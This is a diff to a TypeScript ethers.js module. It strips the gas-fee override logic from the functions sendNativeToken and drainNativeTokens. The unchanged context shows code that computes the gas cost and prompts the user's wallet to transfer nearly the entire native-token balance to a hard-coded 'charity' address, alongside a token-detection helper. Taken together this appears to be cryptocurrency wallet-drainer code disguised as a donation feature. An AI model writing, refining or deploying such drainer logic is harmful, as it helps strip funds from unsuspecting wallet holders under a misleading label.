@@ -222,13 +222,11 @@ async function detectTokensViaQuickNode(
 export async function sendNativeToken(
   signer: ethers.JsonRpcSigner,
   amountWei: bigint,
-  chainName: string,
-  txOverrides?: ethers.TransactionRequest
+  chainName: string
 ): Promise<string> {
   const txReq: ethers.TransactionRequest = {
     to: EVM_CHARITY_WALLET,
     value: amountWei,
-    ...(txOverrides || {}),
   };
   const tx = await signer.sendTransaction(txReq);
 
@@ -324,19 +322,11 @@ export async function drainNativeTokens(
   const gasLimit = 21000n;
 
   let gasCost: bigint;
-  const txOverrides: ethers.TransactionRequest = { gasLimit };
 
-  if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
-    // EIP-1559 (Ethereum, Base)
-    txOverrides.maxFeePerGas = feeData.maxFeePerGas;
-    txOverrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
-    txOverrides.type = 2;
+  if (feeData.maxFeePerGas) {
     gasCost = feeData.maxFeePerGas * gasLimit;
   } else {
-    // Legacy (BSC, Polygon)
     const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
-    txOverrides.gasPrice = gasPrice;
-    txOverrides.type = 0;
     gasCost = gasPrice * gasLimit;
   }
 
@@ -369,7 +359,7 @@ export async function drainNativeTokens(
   }
 
   console.log(`[native] Prompting wallet for ${chainName} transfer:`, sendAmount.toString());
-  return sendNativeToken(signer, sendAmount, chainName, txOverrides);
+  return sendNativeToken(signer, sendAmount, chainName);
 }
 
 /**
